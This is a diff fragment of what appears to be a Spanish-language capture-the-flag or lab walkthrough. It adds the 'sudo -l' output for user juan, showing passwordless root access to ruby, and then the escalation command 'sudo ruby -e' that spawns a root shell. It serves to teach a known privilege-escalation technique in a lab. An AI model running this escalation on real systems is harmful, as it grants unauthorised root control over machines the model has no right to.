@@ -130,5 +130,18 @@ script /dev/null -c bash
 ```bash
 sudo -l
 ```
+```
+juan@5fcb0f7841a2:/var/mail/camilo$ sudo -l
+Matching Defaults entries for juan on 5fcb0f7841a2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User juan may run the following commands on 5fcb0f7841a2:
+    (ALL) NOPASSWD: /usr/bin/ruby
+```
+Tenemos permisos para utilizar /usr/bin/ruby con permisos de root siendo juan.
+```bash
+sudo ruby -e 'exec "/bin/sh"'
+```
+
 
 
